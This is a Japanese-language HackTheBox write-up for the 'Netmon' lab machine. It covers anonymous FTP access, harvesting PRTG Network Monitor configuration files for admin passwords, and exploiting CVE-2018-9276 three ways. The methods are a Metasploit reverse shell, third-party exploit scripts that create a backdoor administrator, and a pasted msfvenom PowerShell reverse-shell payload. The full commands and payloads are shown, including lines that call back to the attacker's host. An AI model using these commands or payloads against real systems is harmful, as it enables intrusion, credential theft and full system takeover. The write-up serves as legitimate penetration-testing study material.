https://app.hackthebox.com/machines/Netmon

## STEP 1
ftpのanonymousログインが可能
```sh
└─$ rustscan -a 10.129.230.176 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.230.176:21
Open 10.129.230.176:80
Open 10.129.230.176:135
Open 10.129.230.176:139
Open 10.129.230.176:445
Open 10.129.230.176:5985
Open 10.129.230.176:47001
Open 10.129.230.176:49664
Open 10.129.230.176:49665
Open 10.129.230.176:49666
Open 10.129.230.176:49667
Open 10.129.230.176:49668
Open 10.129.230.176:49669
10.129.230.176 -> [21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669]
```
```sh
└─$ nmap -n -Pn -p21 -sV --script=ftp-anon 10.129.230.176
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 07:10 EDT
Nmap scan report for 10.129.230.176
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.58 seconds
```


## STEP 2
ftpでファイル探索  
ユーザフラグはゲット！  
ルートフラグは権限不足で確認できず
```sh
└─$ ftp -a 10.129.17.67
Connected to 10.129.17.67.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.


ftp> dir
229 Entering Extended Passive Mode (|||56852|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.


ftp> cd Users
250 CWD command successful.


ftp> dir
229 Entering Extended Passive Mode (|||56853|)
150 Opening ASCII mode data connection.
02-25-19  11:44PM       <DIR>          Administrator
04-17-25  10:19AM       <DIR>          Public
226 Transfer complete.


ftp> more Public\\Desktop\\user.txt
c5a3c0462ce87b64857fbbff23d35c55


ftp> cd Administrator
550 Access is denied.
```


## STEP 3
80番にアクセス  
https://www.paessler.com/ <- ネットワーク監視系のやつらしい
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Netmon_01.png" width="100%" height="100%">  
PRTG Network Monitor の脆弱性を探すと複数発見、３番目が対応している  
[CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)に該当し、Webコンソール画面からOSコマンドインジェクションできるらしい。  
この脆弱性をエクスプロイトするためにクレデンシャルが必要なので探す
```sh
msf6 > search prtg

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/prtg_authenticated_rce_cve_2023_32781  2023-08-09       excellent  Yes    PRTG CVE-2023-32781 Authenticated RCE
   1    \_ target: Windows_Fetch                                  .                .          .      .
   2    \_ target: Windows_CMDStager                              .                .          .      .
   3  exploit/windows/http/prtg_authenticated_rce                 2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE
```
[公式サイト](https://www.paessler.com/manuals/prtg/login#:~:text=When%20you%20log%20in%20for,should%20change%20the%20default%20password.)のデフォルトクレデンシャルではログインできず  
[このサイト](https://kb.paessler.com/en/topic/62202-where-are-stored-passwords-saved)から、パスワードはどうやら「configuration.dat」に保存されている（暗号化されて要るっぽい）と判明  
[このサイト](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)から、「%programdata%\Paessler\PRTG Network Monitor\configuration.dat」にあると推測  
ftpで取得する、「C:\ProgramData」は隠しフォルダなのでFTP上では一見表示されないが確認できる
```sh
└─$ ftp -a 10.129.17.67
Connected to 10.129.17.67.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.


ftp> dir
229 Entering Extended Passive Mode (|||57352|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.


ftp> cd "programdata\\paessler\\PRTG Network Monitor"
250 CWD command successful.


ftp> dir
229 Entering Extended Passive Mode (|||57366|)
150 Opening ASCII mode data connection.
04-17-25  10:55AM       <DIR>          Configuration Auto-Backups
04-17-25  08:00PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
04-17-25  10:21AM       <DIR>          Logs (Web Server)
04-17-25  08:00PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
04-17-25  10:06PM              1732349 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.


ftp> binary 
200 Type set to I.


ftp> get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
229 Entering Extended Passive Mode (|||57460|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1161 KiB   26.83 KiB/s    00:00 ETA
226 Transfer complete.
1189697 bytes received in 00:43 (26.67 KiB/s)
```
パスワードぽいもの発見、やっぱり暗号化されている
```xml
<login>
   prtgadmin
 </login>
 <name>
   PRTG System Administrator
 </name>
 <ownerid>
   100
 </ownerid>
 <password>
   <flags>
     <encrypted/>
   </flags>
   <cell col="0" crypt="PRTG">
     JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
   </cell>
   <cell col="1" crypt="PRTG">
     OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
   </cell>
 </password>
```
同フォルダ内にバックアップファイルものがあったのでダウンロード
```sh
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||59224|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1126 KiB   20.86 KiB/s    00:00 ETA
226 Transfer complete.
1153755 bytes received in 00:54 (20.76 KiB/s)
```
あらあら平文のクレデンシャル発見
```xml
<dbpassword>
 <!-- User: prtgadmin -->
 PrTg@dmin2018
</dbpassword>
```
このクレデンシャルでWebログインしたが失敗  
ここでこのクレデンシャルは2018年に作成されたコンフィグのバックアップファイル  
現在のコンフィグは2019年に作成なので、「PrTg@dmin2018」でなく「PrTg@dmin2019」と推測ができたりできなかったり  
実際に「PrTg@dmin2019」でログインすると成功した！（このパスワード推測CTFっぽいね）
```sh
└─$ ls -l 'PRTG Configuration.dat' 'PRTG Configuration.old.bak' 
-rw-rw-r-- 1 kali kali 1189697 Feb 25  2019 'PRTG Configuration.dat'
-rw-rw-r-- 1 kali kali 1153755 Jul 14  2018 'PRTG Configuration.old.bak'
```


# SOLUTION 1
USE METASPLOIT
## STEP4
`metasploit`を使用してエクスプロイト、フラグゲット！
```sh
msf6 > search prtg

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/prtg_authenticated_rce_cve_2023_32781  2023-08-09       excellent  Yes    PRTG CVE-2023-32781 Authenticated RCE
   1    \_ target: Windows_Fetch                                  .                .          .      .
   2    \_ target: Windows_CMDStager                              .                .          .      .
   3  exploit/windows/http/prtg_authenticated_rce                 2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/prtg_authenticated_rce

msf6 > use 3
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/http/prtg_authenticated_rce) > options

Module options (exploit/windows/http/prtg_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   ADMIN_PASSWORD  prtgadmin        yes       The password for the specified username
   ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                            no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.137.100  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/prtg_authenticated_rce) > set ADMIN_PASSWORD PrTg@dmin2019
ADMIN_PASSWORD => PrTg@dmin2019

msf6 exploit(windows/http/prtg_authenticated_rce) > set RHOSTS 10.129.17.67
RHOSTS => 10.129.17.67

msf6 exploit(windows/http/prtg_authenticated_rce) > set LHOST tun0
LHOST => 10.10.16.5

msf6 exploit(windows/http/prtg_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.16.5:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (177734 bytes) to 10.129.17.67
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.129.17.67:59472) at 2025-04-18 01:48:01 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > search -f root.txt
Found 1 result...
=================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\root.txt  34            2025-04-17 10:13:29 -0400

meterpreter > cat 'c:\Users\Administrator\Desktop\root.txt'
74857cea503cf62366e036300f64b6c8
```


# SOLUTION 2
NO METASPLOIT
## STEP 4
### PoC1
面白いPoCを発見  
PoCの仕組みは、`msfvenom`でリバースシェルのDLLを作成し、`impacket-smbserver`でDLLをアップロード  
CVE-2018-9276のOSコマンドインジェクションでDLLをrundllで実行させ、リバースシェル取得
```sh
└─$ wget https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
--2025-04-18 02:21:32--  https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
Connecting to 192.168.20.37:8080... connected.
Proxy request sent, awaiting response... 200 OK
Length: 16049 (16K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]  15.67K  --.-KB/s    in 0.001s  

2025-04-18 02:21:33 (18.0 MB/s) - ‘exploit.py’ saved [16049/16049]

                                                                                                                                                                                                                                            
└─$ python3.13 exploit.py                                                                                                          
/home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
usage: exploit.py [-h] -i HOST -p PORT --lhost LHOST --lport LPORT [--user USER] [--password PASSWORD] [--https]
exploit.py: error: the following arguments are required: -i/--host, -p/--port, --lhost, --lport
                                                                                                                                                                                                                                            

└─$ python3.13 exploit.py -i 10.129.17.67 -p 80 --lhost 10.10.16.5 --lport 4444 --user "prtgadmin" --password "PrTg@dmin2019"
/home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [10.129.17.67:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2018]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2018] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.16.5 LPORT=4444 OUTPUT=/tmp/bkdpccjp.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
/home/kali/htb/exploit.py:294: DeprecationWarning: setName() is deprecated, set the name attribute instead
  impacket.setName('Impacket')
/home/kali/htb/exploit.py:295: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  impacket.setDaemon(True)
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.16.5\IUGMYMBK]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2019] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it's still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.16.5:4444 for the reverse shell!]
listening on [any] 4444 ...
[*] Incoming connection (10.129.17.67,59854)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
connect to [10.10.16.5] from (UNKNOWN) [10.129.17.67] 59867
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami
whoami
nt authority\system


C:\Windows\system32>exit
[*] Disconnecting Share(2:IUGMYMBK)
exit
[*] Closing down connection (10.129.17.67,59854)
[*] Remaining connections []
```
### PoC2
`searchsploiot`でも面白そうなPoCを発見  
こいつの仕組みは、Cookieを使用してCVE-2018-9276のOSコマンドインジェクションで管理者ユーザを作成する  
そのあとは、自分でPsexecをするなどしてターゲットのシェルを取得するかんじ
```sh
└─$ searchsploit prtg
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                                                                      | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                                                                     | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                                                                                  | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                                                                                   | java/webapps/34108.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            

└─$ searchsploit -m 46527
  Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46527
     Path: /usr/share/exploitdb/exploits/windows/webapps/46527.sh
    Codes: CVE-2018-9276
 Verified: False
File Type: Bourne-Again shell script, ASCII text executable, with very long lines (2429)
Copied to: /home/kali/46527.sh


└─$ ./46527.sh 

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 
 EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```
ブラウザでログインした際のCookieをSniffing
```sh
└─$ tshark -i tun0 -f 'tcp dst port 80' -Y http.cookie -T fields -e http.cookie
Capturing on 'tun0'
_ga=GA1.4.392899000.1745059567; _gid=GA1.4.172396290.1745059567; OCTOPUS1813713946=ezkyQ0M5OUUwLUNCQ0UtNEZENS04RkI1LTcwMjRCNjdBNjI0NX0%3D
```
実行、無事管理者ユーザ作成成功
```sh
└─$ ./46527.sh -u http://10.129.230.176 -c "_ga=GA1.4.392899000.1745059567; _gid=GA1.4.172396290.1745059567; OCTOPUS1813713946=ezkyQ0M5OUUwLUNCQ0UtNEZENS04RkI1LTcwMjRCNjdBNjI0NX0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                                                                                                        

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
```
今回はPsexecがうまく刺さった
```sh
└─$ impacket-psexec 'pentest:P3nT3st!@10.129.230.176'                                                                                                                                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.230.176.....
[*] Found writable share ADMIN$
[*] Uploading file hMYkZSUd.exe
[*] Opening SVCManager on 10.129.230.176.....
[*] Creating service kqqS on 10.129.230.176.....
[*] Starting service kqqS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
### PoC3
OSコマンドインジェクションの該当部分は、通知が送信された際に実行されるプログラムのパラメータになる  
セミコロンの後の文字列がコマンドとして実行されてしまう
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Netmon_02.png" width="100%" height="100%">  
msfvenomで作成したPowershellリバースシェルを上図のように貼り付ける、通知をテストで送信できるので実行すると
```sh
└─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=tun0 LPORT=4444       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1883 bytes
A�8�u�LLE9�u�XD�@$I�fA�H�P�H▒D�@ I��VH��A�4�H�M1�H1��A��
                       HD�@I�A��H�AXAX^YZAXAYAZH�� AR��XAYZH��W���]H�H��A�1�o��ջ���VA�������H��(<|
���u�GrojYA����powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIALHyBGgCA5VVXW/jNhB8969YGGojIRLhBAcUDZBDXV2uC{1'+'}C7M05p82AY'+'CE2tYzU06Z{1}UbCPxfy8pUR+OE7QnG{1}bIXQ6Hs0NyUQpmCingDzT{1}Hc4ZL1AYGDwPwD7BhsElfMVN8m3+NzIDye1ujV/pCm2nITY/rfKbZPKnxk+4oCU3qcLcRgrKtYUIjCqxzZooud2RVxm2v9fT5A72g0VDcS03qGzLsoMqPqGKrsL6e5oZVYiHWZDK1YqKPD7szTRnUrzq/CQ3gkuaV72Rx1SSodbgBVj{1}vOToCP4WRlCn{2}AsIm2kgwX9gOC9EPoyqYD2u'+'GssLbVCgsoOn2c5+r4hTLZPsEY0mt2x94zNmH+xzP{1}BoQ5Vx8/qZq6gv0WUvb8wYro0{2}'+'rMsR1lT279{2}V+IRK4zHj{2}rpX8reYpxM/0fBsRNzvA/nl12HsVuGnHtTyaaOQrhzXGppYm2VVn+XYsa'+'urU5NzThn6YvSoac2zBuwddshKVZgdyZrU0M8fBwtrKYzD5+DWou8hoRqmB2O+40oaT{2}GZYlEwavAvyoucOt+llPM5Z'+'Y+zKHqDDhmXZulM6waN9Zu6BKLkPB4ars/Oh55MH6sV'+'qVtkX'+'8XpfGdwOps{2}7u2sOCLkfGSfl5+eR3svNIq8CYdTg1tDUDCZO59fXIyz9Po6cuL/7nL'+'C4Z01rNxomLgtlS2Rc1ClEDYbrDSltqYdwikEK{1}4uXEu4LX9q+2yV2'+'gCTq3VpuuC9SOV6p4qHpYEwjeBLwZTUcmEglWotVaUmgbGbzCVpUGixnzAn9+{1}eeDt6OcidrQuG3cLiUdw1yA2KB7Pse6jZzH0XHZnox1Sans7gxkI6WfxBQ{2}qeP861GfVZqivKlpZzDQq{2}aA+aLquj7Z7w4HyOSLPa+ihrkKKXa/EkHzG52q6tttrq3aLs+5baLAuOYRgUlevqRXxHmoe1x2IYxRAcsI8gEQijI0mvnH6Y31ot37sq/B51KaTS+Mpr3qHYnUYdlR6aPyqq1TWiQlBEr6ppN6Yr5tG6IWmOvBr8/OPPZ/AC30qT1KjgzXMAdQ6VIA3wKZxMMjix70r/'+'G8kqD0dkQs3SRT/CSQeydUQCVEqq6W'+'h2M{2}mPdRUnjCNVYfQWg8t+w2617eDYwP/Lvx3Mfzq2b9gjvzZjPvNSL9tb0B88/lxPudTo11Ntx+Zu6humu7AyI9fNLeX/rTPbC76tnb+'+'p/gVauNSBpggAAA{0}{0}')-f'=','J','F')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```
エラーは出たが、無事リバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.79] from (UNKNOWN) [10.129.230.176] 56266
Windows PowerShell running as user NETMON$ on NETMON
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Windows\system32> Test-Path : Cannot bind argument to parameter 'Path' because it is an empty 
string.
At C:\Program Files (x86)\PRTG Network Monitor\Notifications\exe\Demo EXE 
Notification - OutFile.ps1:30 char:17
+   if (Test-Path $Path)
+                 ~~~~~
    + CategoryInfo          : InvalidData: (:) [Test-Path], ParameterBindingVa 
   lidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorEmptyStringNotAl 
   lowed,Microsoft.PowerShell.Commands.TestPathCommand

PS C:\Windows\system32> whoami
nt authority\system
```
